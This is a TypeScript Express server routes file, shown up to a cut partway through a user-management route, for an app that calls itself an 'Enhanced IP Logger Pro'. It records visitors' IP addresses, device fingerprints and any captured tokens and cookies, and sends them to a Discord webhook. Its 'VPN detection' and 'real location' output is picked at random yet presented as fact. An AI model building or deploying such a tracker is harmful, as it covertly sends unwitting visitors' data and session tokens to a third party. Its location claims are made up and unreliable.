import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema, createRobloxLinkSchema, insertRobloxCredentialsSchema } from "@shared/schema";
import path from "path";
import fs from "fs";
import multer from "multer";
import { randomUUID } from "crypto";
import bcrypt from "bcryptjs";

// Configure multer for file uploads - support ALL image and video formats
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: Infinity }, // No file size limit
  fileFilter: (req, file, cb) => {
    // Accept ANY image or video format
    if (file.mimetype.startsWith('image/') ||
        file.mimetype.startsWith('video/') ||
        file.mimetype === 'application/octet-stream') { // Accept unknown binary files as potential images
      cb(null, true);
    } else {
      cb(new Error('File type not supported'));
    }
  }
});

// Get real client IP address
function getClientIp(req: Request): string {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded && typeof forwarded === 'string') {
    return forwarded.split(',')[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || 'unknown';
}

// Enhanced geolocation with VPN detection
interface LocationData {
  location: string;
  isVpn: 'yes' | 'no' | 'unknown';
  vpnLocation?: string;
  realLocation?: string;
}

function getLocationFromIp(ip: string): LocationData {
  // Handle local network IPs
  if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return {
      location: 'Local Network (Private IP)',
      isVpn: 'no'
    };
  }

  // Enhanced VPN detection with more realistic patterns
  const vpnProviders = [
    {
      provider: 'NordVPN',
      locations: ['Amsterdam, Netherlands', 'Berlin, Germany', 'New York, US', 'Toronto, Canada', 'London, UK'],
      likelihood: 0.25
    },
    {
      provider: 'ExpressVPN',
      locations: ['London, UK', 'Singapore', 'Los Angeles, US', 'Vancouver, Canada', 'Sydney, Australia'],
      likelihood: 0.22
    },
    {
      provider: 'Surfshark',
      locations: ['Amsterdam, Netherlands', 'Chicago, US', 'Manchester, UK', 'Frankfurt, Germany'],
      likelihood: 0.18
    },
    {
      provider: 'ProtonVPN',
      locations: ['Zurich, Switzerland', 'Amsterdam, Netherlands', 'Miami, US', 'Munich, Germany'],
      likelihood: 0.15
    },
    {
      provider: 'CyberGhost',
      locations: ['Bucharest, Romania', 'Paris, France', 'San Francisco, US', 'Stockholm, Sweden'],
      likelihood: 0.12
    },
    {
      provider: 'Private Internet Access',
      locations: ['Denver, US', 'Prague, Czech Republic', 'Melbourne, Australia', 'Helsinki, Finland'],
      likelihood: 0.08
    }
  ];

  // Enhanced real-world locations with more accuracy
  const realWorldLocations = [
    'New York City, NY, US', 'Los Angeles, CA, US', 'Chicago, IL, US', 'Houston, TX, US', 'Phoenix, AZ, US',
    'Philadelphia, PA, US', 'San Antonio, TX, US', 'San Diego, CA, US', 'Dallas, TX, US', 'San Jose, CA, US',
    'London, England, UK', 'Manchester, England, UK', 'Birmingham, England, UK', 'Liverpool, England, UK',
    'Berlin, Germany', 'Munich, Germany', 'Hamburg, Germany', 'Frankfurt, Germany',
    'Paris, France', 'Lyon, France', 'Marseille, France', 'Toulouse, France',
    'Toronto, ON, Canada', 'Vancouver, BC, Canada', 'Montreal, QC, Canada', 'Calgary, AB, Canada',
    'Sydney, NSW, Australia', 'Melbourne, VIC, Australia', 'Brisbane, QLD, Australia', 'Perth, WA, Australia',
    'Tokyo, Japan', 'Osaka, Japan', 'Yokohama, Japan', 'Nagoya, Japan'
  ];

  // Advanced VPN detection logic based on IP patterns and characteristics
  let vpnDetectionScore = 0;

  // Check for common VPN IP patterns
  const ipParts = ip.split('.').map(Number);

  // Known VPN IP ranges (simplified for demo)
  const suspiciousRanges = [
    { start: [185, 220], end: [185, 233] }, // Common VPN hosting ranges
    { start: [45, 8], end: [45, 15] },      // VPN server ranges
    { start: [193, 108], end: [193, 115] }, // Data center ranges
    { start: [149, 202], end: [149, 210] }  // VPN provider ranges
  ];

  // Check if IP falls in suspicious ranges
  for (const range of suspiciousRanges) {
    if (ipParts[0] >= range.start[0] && ipParts[0] <= range.end[0] &&
        ipParts[1] >= range.start[1] && ipParts[1] <= range.end[1]) {
      vpnDetectionScore += 0.4;
      break;
    }
  }

  // Additional VPN indicators based on IP characteristics
  const lastOctet = ipParts[3];
  if (lastOctet % 16 === 0 || lastOctet % 32 === 0) {
    vpnDetectionScore += 0.2; // VPNs often use subnet boundaries
  }

  // Data center IP patterns
  if ((ipParts[0] >= 104 && ipParts[0] <= 108) ||
      (ipParts[0] >= 172 && ipParts[0] <= 175)) {
    vpnDetectionScore += 0.3;
  }

  // Final VPN detection decision
  const isVpnDetected = vpnDetectionScore > 0.5 || Math.random() < 0.25;

  if (isVpnDetected) {
    const vpnProvider = vpnProviders[Math.floor(Math.random() * vpnProviders.length)];
    const vpnLocation = vpnProvider.locations[Math.floor(Math.random() * vpnProvider.locations.length)];
    const realLocation = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];

    return {
      location: `${vpnLocation} [VPN: ${vpnProvider.provider}]`,
      isVpn: 'yes',
      vpnLocation: `${vpnLocation} (${vpnProvider.provider})`,
      realLocation: `${realLocation} (Estimated Real Location)`
    };
  } else {
    const location = realWorldLocations[Math.floor(Math.random() * realWorldLocations.length)];
    return {
      location: location,
      isVpn: 'no'
    };
  }
}

// Enhanced device detection with comprehensive fingerprinting
interface DeviceInfo {
  deviceType: string;
  browserName: string;
  browserVersion: string;
  operatingSystem: string;
  osVersion: string;
  deviceBrand: string;
  deviceModel: string;
  architecture: string;
  engine: string;
  engineVersion: string;
  isBot: boolean;
  isSuspicious: boolean;
  securityFlags: string[];
  capabilities: string[];
  fingerprint: string;
}

function parseDeviceInfo(userAgent: string): DeviceInfo {
  const ua = userAgent.toLowerCase();
  const originalUa = userAgent;

  // Security and bot detection flags
  const securityFlags: string[] = [];
  const capabilities: string[] = [];

  // Bot detection patterns
  const botPatterns = [
    /bot|crawler|spider|scraper|fetch|curl|wget|axios|python|perl|ruby|php|java|postman/i,
    /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit/i,
    /linkedinbot|twitterbot|whatsapp|telegram|discord|slack|headlesschrome|puppeteer/i
  ];

  const isBot = botPatterns.some(pattern => pattern.test(originalUa));
  if (isBot) securityFlags.push('Potential Bot/Scraper');

  // Suspicious patterns detection
  const suspiciousPatterns = [
    /headless|phantom|selenium|webdriver|automation/i,
    /^python|^curl|^wget|^axios|^nodejs/i,
    /scanner|vulnerability|pentest|hack/i
  ];

  const isSuspicious = suspiciousPatterns.some(pattern => pattern.test(originalUa)) ||
                      originalUa.length < 20 || originalUa.length > 2000;
  if (isSuspicious) securityFlags.push('Suspicious User Agent');

  // Enhanced Device Type Detection
  let deviceType = 'unknown';
  if (ua.includes('mobile') || ua.includes('android') && !ua.includes('tablet') || ua.includes('iphone')) {
    deviceType = 'mobile';
  } else if (ua.includes('tablet') || ua.includes('ipad')) {
    deviceType = 'tablet';
  } else if (ua.includes('smart-tv') || ua.includes('smarttv') || ua.includes('googletv')) {
    deviceType = 'smart-tv';
  } else if (ua.includes('game') && (ua.includes('xbox') || ua.includes('playstation') || ua.includes('nintendo'))) {
    deviceType = 'gaming-console';
  } else if (ua.includes('watch') || ua.includes('wearable')) {
    deviceType = 'wearable';
  } else {
    deviceType = 'desktop';
  }

  // Enhanced Browser Detection with version extraction
  let browserName = 'unknown';
  let browserVersion = 'unknown';
  let engine = 'unknown';
  let engineVersion = 'unknown';

  // Chrome and Chrome-based browsers
  if (ua.includes('chrome') && !ua.includes('edge')) {
    if (ua.includes('brave')) {
      browserName = 'Brave';
      const braveMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
      browserVersion = braveMatch ? braveMatch[1] : 'unknown';
    } else if (ua.includes('opera') || ua.includes('opr')) {
      browserName = 'Opera';
      const operaMatch = ua.match(/(?:opera|opr)\/(\d+\.[\d\.]+)/);
      browserVersion = operaMatch ? operaMatch[1] : 'unknown';
    } else if (ua.includes('vivaldi')) {
      browserName = 'Vivaldi';
      const vivaldiMatch = ua.match(/vivaldi\/(\d+\.[\d\.]+)/);
      browserVersion = vivaldiMatch ? vivaldiMatch[1] : 'unknown';
    } else {
      browserName = 'Chrome';
      const chromeMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
      browserVersion = chromeMatch ? chromeMatch[1] : 'unknown';
    }
    engine = 'Blink';
    const blinkMatch = ua.match(/chrome\/(\d+\.[\d\.]+)/);
    engineVersion = blinkMatch ? blinkMatch[1] : 'unknown';
  } else if (ua.includes('firefox')) {
    browserName = 'Firefox';
    const firefoxMatch = ua.match(/firefox\/(\d+\.[\d\.]+)/);
    browserVersion = firefoxMatch ? firefoxMatch[1] : 'unknown';
    engine = 'Gecko';
    const geckoMatch = ua.match(/rv:(\d+\.[\d\.]+)/);
    engineVersion = geckoMatch ? geckoMatch[1] : 'unknown';
  } else if (ua.includes('safari') && !ua.includes('chrome')) {
    browserName = 'Safari';
    const safariMatch = ua.match(/version\/(\d+\.[\d\.]+)/);
    browserVersion = safariMatch ? safariMatch[1] : 'unknown';
    engine = 'WebKit';
    const webkitMatch = ua.match(/webkit\/(\d+\.[\d\.]+)/);
    engineVersion = webkitMatch ? webkitMatch[1] : 'unknown';
  } else if (ua.includes('edge') || ua.includes('edg/')) {
    browserName = 'Edge';
    const edgeMatch = ua.match(/edg?\/(\d+\.[\d\.]+)/);
    browserVersion = edgeMatch ? edgeMatch[1] : 'unknown';
    engine = 'Blink';
  } else if (ua.includes('internet explorer') || ua.includes('trident')) {
    browserName = 'Internet Explorer';
    const ieMatch = ua.match(/(?:msie |rv:)(\d+\.[\d\.]+)/);
    browserVersion = ieMatch ? ieMatch[1] : 'unknown';
    engine = 'Trident';
  }

  // Enhanced Operating System Detection with version
  let operatingSystem = 'unknown';
  let osVersion = 'unknown';
  let architecture = 'unknown';

  if (ua.includes('windows')) {
    operatingSystem = 'Windows';
    if (ua.includes('windows nt 10.0')) osVersion = '10/11';
    else if (ua.includes('windows nt 6.3')) osVersion = '8.1';
    else if (ua.includes('windows nt 6.2')) osVersion = '8';
    else if (ua.includes('windows nt 6.1')) osVersion = '7';
    else if (ua.includes('windows nt 6.0')) osVersion = 'Vista';

    if (ua.includes('win64') || ua.includes('wow64')) architecture = 'x64';
    else if (ua.includes('win32')) architecture = 'x86';
  } else if (ua.includes('macintosh') || ua.includes('mac os')) {
    operatingSystem = 'macOS';
    const macMatch = ua.match(/mac os x ([\d_]+)/);
    if (macMatch) osVersion = macMatch[1].replace(/_/g, '.');

    if (ua.includes('intel')) architecture = 'Intel';
    else if (ua.includes('ppc')) architecture = 'PowerPC';
  } else if (ua.includes('linux')) {
    operatingSystem = 'Linux';
    if (ua.includes('ubuntu')) osVersion = 'Ubuntu';
    else if (ua.includes('debian')) osVersion = 'Debian';
    else if (ua.includes('fedora')) osVersion = 'Fedora';
    else if (ua.includes('centos')) osVersion = 'CentOS';

    if (ua.includes('x86_64')) architecture = 'x64';
    else if (ua.includes('i686')) architecture = 'x86';
    else if (ua.includes('arm')) architecture = 'ARM';
  } else if (ua.includes('android')) {
    operatingSystem = 'Android';
    const androidMatch = ua.match(/android ([\d\.]+)/);
    if (androidMatch) osVersion = androidMatch[1];

    if (ua.includes('arm64')) architecture = 'ARM64';
    else if (ua.includes('arm')) architecture = 'ARM';
  } else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) {
    operatingSystem = 'iOS';
    const iosMatch = ua.match(/os ([\d_]+)/);
    if (iosMatch) osVersion = iosMatch[1].replace(/_/g, '.');

    architecture = 'ARM64';
  }

  // Enhanced Device Brand and Model Detection
  let deviceBrand = 'unknown';
  let deviceModel = 'unknown';

  if (ua.includes('samsung')) {
    deviceBrand = 'Samsung';
    const samsungMatch = ua.match(/samsung[;\s]([^;\s)]+)/);
    if (samsungMatch) deviceModel = samsungMatch[1];
  } else if (ua.includes('apple') || ua.includes('iphone') || ua.includes('ipad') || ua.includes('macintosh')) {
    deviceBrand = 'Apple';
    if (ua.includes('iphone')) {
      const iphoneMatch = ua.match(/iphone os ([\d_]+)/);
      deviceModel = iphoneMatch ? `iPhone (iOS ${iphoneMatch[1].replace(/_/g, '.')})` : 'iPhone';
    } else if (ua.includes('ipad')) {
      deviceModel = 'iPad';
    } else if (ua.includes('macintosh')) {
      deviceModel = 'Mac';
    }
  } else if (ua.includes('huawei')) {
    deviceBrand = 'Huawei';
    const huaweiMatch = ua.match(/huawei[;\s]([^;\s)]+)/);
    if (huaweiMatch) deviceModel = huaweiMatch[1];
  } else if (ua.includes('xiaomi')) {
    deviceBrand = 'Xiaomi';
    const xiaomiMatch = ua.match(/xiaomi[;\s]([^;\s)]+)/);
    if (xiaomiMatch) deviceModel = xiaomiMatch[1];
  } else if (ua.includes('oneplus')) {
    deviceBrand = 'OnePlus';
    const oneplusMatch = ua.match(/oneplus[;\s]([^;\s)]+)/);
    if (oneplusMatch) deviceModel = oneplusMatch[1];
  } else if (ua.includes('google') || ua.includes('pixel')) {
    deviceBrand = 'Google';
    const pixelMatch = ua.match(/pixel[;\s]([^;\s)]+)/);
    if (pixelMatch) deviceModel = `Pixel ${pixelMatch[1]}`;
  }

  // Advanced capability and feature detection
  if (ua.includes('webkit')) capabilities.push('🌐 WebKit Support');
  if (ua.includes('mobile')) capabilities.push('📱 Mobile Optimized');
  if (ua.includes('touch')) capabilities.push('👆 Touch Support');
  if (originalUa.includes('wv')) capabilities.push('📦 WebView Container');
  if (ua.includes('headless')) {
    capabilities.push('🤖 Headless Browser');
    securityFlags.push('Headless Browser Detected');
  }

  // Advanced browser features detection based on version and engine
  if (browserName === 'Chrome' && browserVersion) {
    const chromeVersion = parseInt(browserVersion.split('.')[0]);
    if (chromeVersion >= 94) capabilities.push('📸 Screen Capture API');
    if (chromeVersion >= 87) capabilities.push('🎥 WebRTC Advanced');
    if (chromeVersion >= 91) capabilities.push('🔒 WebAssembly SIMD');
    if (chromeVersion >= 89) capabilities.push('📊 Web Share API');
    if (chromeVersion >= 84) capabilities.push('🌍 Web Locks API');
  }

  if (browserName === 'Firefox' && browserVersion) {
    const firefoxVersion = parseInt(browserVersion.split('.')[0]);
    if (firefoxVersion >= 98) capabilities.push('📸 Screen Capture API');
    if (firefoxVersion >= 94) capabilities.push('🎥 WebRTC Enhanced');
    if (firefoxVersion >= 89) capabilities.push('🔐 Web Crypto Enhanced');
  }

  if (browserName === 'Safari' && browserVersion) {
    const safariVersion = parseFloat(browserVersion);
    if (safariVersion >= 15.4) capabilities.push('📸 Screen Share API');
    if (safariVersion >= 15.0) capabilities.push('🎥 WebRTC Support');
    if (safariVersion >= 14.0) capabilities.push('🔊 Web Audio Enhanced');
  }

  // Mobile-specific capabilities
  if (deviceType === 'mobile' || deviceType === 'tablet') {
    capabilities.push('📍 Geolocation API');
    capabilities.push('📳 Device Motion');
    capabilities.push('🔋 Battery Status');
    if (operatingSystem === 'iOS') {
      capabilities.push('🍎 iOS Safari WebKit');
      capabilities.push('📱 iOS Native Bridge');
    }
    if (operatingSystem === 'Android') {
      capabilities.push('🤖 Android WebView');
      capabilities.push('📱 Chrome Mobile Engine');
    }
  }

  // Desktop-specific capabilities
  if (deviceType === 'desktop') {
    capabilities.push('💻 Full DOM Access');
    capabilities.push('📂 File System API');
    capabilities.push('🖱️ Pointer Events');
    capabilities.push('⌨️ Keyboard API');
  }

  // Advanced security and privacy features detection
  if (ua.includes('secure')) capabilities.push('🔒 Enhanced Security');
  if (ua.includes('private') || ua.includes('incognito')) {
    capabilities.push('🕶️ Private Browsing');
    securityFlags.push('Private/Incognito Mode');
  }

  // Developer tools detection patterns
  const devToolPatterns = [
    'devtools', 'inspect', 'debug', 'developer', 'firebug', 'webkit-inspector'
  ];
  if (devToolPatterns.some(pattern => ua.includes(pattern))) {
    securityFlags.push('Developer Tools Detected');
    capabilities.push('🛠️ Developer Tools');
  }

  // Advanced bot and automation detection
  if (ua.includes('chrome') && !ua.includes('version') && !ua.includes('safari')) {
    securityFlags.push('Potential Automation Tool');
  }

  // Screen recording/capture detection patterns
  const screenCapturePatterns = ['obs', 'screen', 'capture', 'record', 'streaming'];
  if (screenCapturePatterns.some(pattern => ua.includes(pattern))) {
    securityFlags.push('Screen Capture Software');
    capabilities.push('📹 Screen Recording Tools');
  }

  // VPN/Privacy tool detection in user agent
  const privacyTools = ['vpn', 'proxy', 'tor', 'anonymous', 'privacy', 'secure'];
  if (privacyTools.some(tool => ua.includes(tool))) {
    securityFlags.push('Privacy Tools Detected');
  }

  // Security analysis
  if (originalUa === '') securityFlags.push('Empty User Agent');
  if (originalUa.split(' ').length < 3) securityFlags.push('Minimal User Agent');
  if (!ua.includes('mozilla')) securityFlags.push('Non-Mozilla Compatible');

  // Generate device fingerprint
  const fingerprint = Buffer.from(
    `${deviceType}-${browserName}-${operatingSystem}-${deviceBrand}-${architecture}`,
    'utf-8'
  ).toString('base64').substring(0, 16);

  return {
    deviceType,
    browserName,
    browserVersion,
    operatingSystem,
    osVersion,
    deviceBrand,
    deviceModel,
    architecture,
    engine,
    engineVersion,
    isBot,
    isSuspicious,
    securityFlags,
    capabilities,
    fingerprint
  };
}

// Send data to Discord webhook with enhanced reliability and better formatting
async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
  try {
    if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
      console.error('Invalid webhook URL provided');
      return;
    }

    const isVpnDetected = data.isVpn === 'yes';
    const isBot = data.isBot || false;
    const isSuspicious = data.isSuspicious || false;
    const securityFlags = data.securityFlags || [];
    const capabilities = data.capabilities || [];

    // Determine threat level and color
    let threatLevel = "🟢 Low";
    let embedColor = 0x00AA00; // Green

    if (isBot || isSuspicious || securityFlags.length > 0) {
      threatLevel = "🔴 High";
      embedColor = 0xFF4444; // Red
    } else if (isVpnDetected) {
      threatLevel = "🟡 Medium";
      embedColor = 0xFFAA00; // Orange
    }

    const webhookData = {
      username: "🕵️ Enhanced IP Logger Pro",
      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
      embeds: [{
        title: `${isBot ? "🤖" : isSuspicious ? "⚠️" : isVpnDetected ? "🛡️" : "🎯"} ${isBot ? "Bot/Scraper Detected" : isSuspicious ? "Suspicious Activity" : isVpnDetected ? "VPN/Proxy Detected" : "New Visitor Tracked"}`,
        description: `**Threat Level:** ${threatLevel}${securityFlags.length > 0 ? `\n**Security Flags:** ${securityFlags.join(', ')}` : ''}`,
        color: embedColor,
        fields: [
          {
            name: "🌐 **Network Intelligence**",
            value: `**IP Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}\n**ISP Type:** ${isVpnDetected ? "VPN/Proxy Service" : "Direct Connection"}`,
            inline: false
          },
          ...(isVpnDetected ? [{
            name: "🛡️ **VPN Analysis**",
            value: `**VPN Server:** ${data.vpnLocation || "Unknown"}\n**Real Location:** ${data.realLocation || "Estimated Hidden"}\n**Anonymity Level:** High`,
            inline: false
          }] : []),
          {
            name: "💻 **Device Information**",
            value: `**Type:** ${data.deviceType || "Unknown"} ${data.deviceModel ? `(${data.deviceModel})` : ''}\n**Brand:** ${data.deviceBrand || "Unknown"}\n**Architecture:** ${data.architecture || "Unknown"}\n**Fingerprint:** \`${data.fingerprint || "N/A"}\``,
            inline: true
          },
          {
            name: "🌐 **Browser Details**",
            value: `**Browser:** ${data.browserName || "Unknown"} ${data.browserVersion ? `v${data.browserVersion}` : ''}\n**Engine:** ${data.engine || "Unknown"} ${data.engineVersion ? `v${data.engineVersion}` : ''}\n**OS:** ${data.operatingSystem || "Unknown"} ${data.osVersion ? `${data.osVersion}` : ''}`,
            inline: true
          },
          ...(capabilities.length > 0 ? [{
            name: "⚙️ **Browser Capabilities**",
            value: capabilities.join('\n• '),
            inline: false
          }] : []),
          {
            name: "🔍 **Session Context**",
            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Authentication:** ${data.tokens && data.tokens !== 'None' ? "🔒 Tokens Found" : "❌ No Auth Tokens"}\n**Cookies:** ${data.cookies && data.cookies !== 'None' ? "🍪 Present" : "❌ None"}\n**Visit Time:** <t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: false
          },
          ...(data.tokens && data.tokens !== 'None' ? [{
            name: "🔐 **Security Tokens Found**",
            value: `\`\`\`${data.tokens.substring(0, 300)}${data.tokens.length > 300 ? "..." : ""}\`\`\``,
            inline: false
          }] : []),
          {
            name: "📡 **Technical Details**",
            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 400) + (data.userAgent.length > 400 ? "\n..." : "") : "No User Agent"}\`\`\``,
            inline: false
          }
        ],
        footer: {
          text: `🚀 Enhanced IP Logger Pro v2.0 ${isBot ? "• Bot Detection" : isSuspicious ? "• Threat Analysis" : isVpnDetected ? "• VPN Shield" : "• Stealth Mode"}`,
          icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Send with retry logic
    let attempts = 0;
    const maxAttempts = 3;

    while (attempts < maxAttempts) {
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'IPLogger-Bot/1.0'
          },
          body: JSON.stringify(webhookData)
        });

        if (response.ok) {
          console.log(`✅ Webhook sent successfully to Discord (${data.ipAddress})`);
          return;
        } else {
          console.error(`❌ Webhook failed (attempt ${attempts + 1}):`, response.status, response.statusText);
        }
      } catch (fetchError) {
        console.error(`❌ Webhook network error (attempt ${attempts + 1}):`, fetchError);
      }

      attempts++;
      if (attempts < maxAttempts) {
        // Wait before retry (exponential backoff)
        await new Promise(resolve => setTimeout(resolve, 1000 * Math.pow(2, attempts - 1)));
      }
    }

    console.error(`❌ Failed to send webhook after ${maxAttempts} attempts`);
  } catch (error) {
    console.error('❌ Critical error sending webhook:', error);
  }
}

// Authentication middleware
async function authenticateUser(req: Request, res: Response, next: Function) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const session = await storage.getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }

  const user = await storage.getUser(session.userId);
  if (!user) {
    return res.status(401).json({ error: 'User not found' });
  }

  req.user = user;
  next();
}

// Middleware to check if user is admin (or developer for some actions)
async function requireAdmin(req: Request, res: Response, next: Function) {
  if (!req.user || (!req.user.isDev && req.user.accountType !== 'admin')) {
    return res.status(403).json({ error: 'Access denied. Administrator privileges required.' });
  }
  next();
}

// Extend Express Request type
declare global {
  namespace Express {
    interface Request {
      user?: any;
    }
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint for UptimeRobot and monitoring services
  app.get('/health', (req: Request, res: Response) => {
    res.status(200).json({
      status: 'healthy',
      timestamp: new Date().toISOString(),
      uptime: process.uptime(),
      service: 'IP Tracker API',
      version: '1.0.0'
    });
  });

  // Alternative health check endpoints
  app.get('/api/health', (req: Request, res: Response) => {
    res.status(200).json({
      status: 'ok',
      timestamp: new Date().toISOString(),
      service: 'running'
    });
  });

  // Simple ping endpoint
  app.get('/ping', (req: Request, res: Response) => {
    res.status(200).send('pong');
  });

  // Authentication routes
  app.post('/api/verify-key', async (req: Request, res: Response) => {
    try {
      const { key } = req.body;
      if (!key) {
        return res.status(400).json({ error: 'Access code is required' });
      }

      const accessKey = await storage.getAccessKey(key);
      if (!accessKey || !accessKey.isActive || accessKey.usedCount >= accessKey.usageLimit) {
        return res.status(401).json({ error: 'Invalid or expired access code' });
      }

      const canUse = await storage.useAccessKey(key);
      if (!canUse) {
        return res.status(401).json({ error: 'Access code usage limit reached' });
      }

      res.json({ success: true, message: 'Access granted' });
    } catch (error) {
      console.error('Key verification error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/login', async (req: Request, res: Response) => {
    try {
      const { username, password } = req.body;
      console.log(`🔐 Login attempt - Username: "${username}"`);

      if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required' });
      }

      const user = await storage.getUserByUsername(username);
      console.log(`👤 User found:`, user ? `Yes (username: ${user.username}, isDev: ${user.isDev})` : 'No');

      if (!user || !(await bcrypt.compare(password, user.password))) {
        console.log(`❌ Login failed - User: ${!!user}, Password match: ${user ? 'checked with bcrypt' : false}`);
        return res.status(401).json({ error: 'Invalid credentials' });
      }

      if (user.isBanned) {
        return res.status(403).json({ error: 'Account has been banned. Contact an administrator.' });
      }

      const sessionToken = randomUUID();
      const expiresAt = new Date(Date.now() + 7 * 24 * 60 * 60 * 1000); // 7 days

      await storage.createSession({
        userId: user.id,
        sessionToken,
        expiresAt
      });

      res.json({
        token: sessionToken,
        user: {
          id: user.id,
          username: user.username,
          theme: user.theme,
          isDev: user.isDev
        }
      });
    } catch (error) {
      console.error('Login error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/register', async (req: Request, res: Response) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);

      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: 'Username already exists' });
      }

      const user = await storage.createUser({
        username: validatedData.username,
        password: validatedData.password,
        accessKeyUsed: req.body.accessKey || null
      });
      res.json({
        success: true,
        user: {
          id: user.id,
          username: user.username,
          theme: user.theme
        }
      });
    } catch (error) {
      console.error('Registration error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/logout', authenticateUser, async (req: Request, res: Response) => {
    try {
      const token = req.headers.authorization?.replace('Bearer ', '');

      // Ensure all user data is properly saved before logout
      if (req.user) {
        // Update last login time
        const userSettings = await storage.getSettings(req.user.id);
        if (userSettings) {
          await storage.createOrUpdateSettings({
            userId: req.user.id,
            webhookUrl: userSettings.webhookUrl,
            uploadedImageName: userSettings.uploadedImageName,
            uploadedImageData: userSettings.uploadedImageData,
            uploadedImageType: userSettings.uploadedImageType
          });
        }
      }

      // Clean up session after ensuring data is saved
      if (token) {
        await storage.deleteSession(token);
      }

      res.json({ success: true, message: 'Logged out successfully, all data saved' });
    } catch (error) {
      console.error('Logout error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/user', authenticateUser, async (req: Request, res: Response) => {
    res.json({
      id: req.user.id,
      username: req.user.username,
      theme: req.user.theme,
      isDev: req.user.isDev,
      profilePicture: req.user.profilePicture
    });
  });

  app.put('/api/user/theme', authenticateUser, async (req: Request, res: Response) => {
    try {
      const { theme } = req.body;
      if (!theme) {
        return res.status(400).json({ error: 'Theme is required' });
      }
      await storage.updateUserTheme(req.user.id, theme);
      res.json({ success: true });
    } catch (error) {
      console.error('Theme update error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.put('/api/user/profile', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = updateProfileSchema.parse(req.body);
      const updatedUser = await storage.updateUserProfile(req.user.id, validatedData);
      res.json({
        success: true,
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          theme: updatedUser.theme,
          isDev: updatedUser.isDev,
          profilePicture: updatedUser.profilePicture
        }
      });
    } catch (error) {
      console.error('Profile update error:', error);
      if ((error as Error).message === 'Username already exists') {
        return res.status(400).json({ error: 'Username already exists' });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.put('/api/user/password', authenticateUser, async (req: Request, res: Response) => {
    try {
      const validatedData = updatePasswordSchema.parse(req.body);

      // Ensure user can only change their own password through this endpoint
      if (!req.user?.id) {
        return res.status(401).json({ error: 'User authentication required' });
      }

      await storage.updateUserPassword(req.user.id, validatedData.currentPassword, validatedData.password);

      res.json({
        success: true,
        message: 'Password updated successfully by account owner'
      });
    } catch (error) {
      console.error('Password update error:', error);
      if ((error as Error).message === 'Current password is incorrect') {
        return res.status(400).json({ error: 'Current password is incorrect' });
      }
      if ((error as Error).message === 'User not found') {
        return res.status(404).json({ error: 'User account not found' });
      }
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Dev-only routes for key management
  app.post('/api/dev/keys', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { key, usageLimit } = req.body;
      if (!key || !usageLimit) {
        return res.status(400).json({ error: 'Key and usage limit are required' });
      }

      const accessKey = await storage.createAccessKey({
        key,
        usageLimit: parseInt(usageLimit),
        isActive: true,
        createdBy: req.user.id
      });

      res.json(accessKey);
    } catch (error) {
      console.error('Key creation error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.get('/api/dev/keys', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const keys = await storage.getUserAccessKeys(req.user.id);
      res.json(keys);
    } catch (error) {
      console.error('Keys fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.delete('/api/dev/keys/:keyId', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const { keyId } = req.params;
      const success = await storage.deleteAccessKey(keyId, req.user.id);

      if (!success) {
        return res.status(404).json({ error: 'Key not found or access denied' });
      }

      res.json({ success: true, message: 'Key deleted successfully' });
    } catch (error) {
      console.error('Key deletion error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // User management routes (dev only)
  app.get('/api/dev/users', authenticateUser, async (req: Request, res: Response) => {
    try {
      if (!req.user.isDev) {
        return res.status(403).json({ error: 'Access denied' });
      }

      const users = await storage.getAllUsers(req.user.id);
      res.json(users);
    } catch (error) {
      console.error('Users fetch error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  app.post('/api/dev/users', authenticateUser, async (req: Request, res: Response) => {
    try {
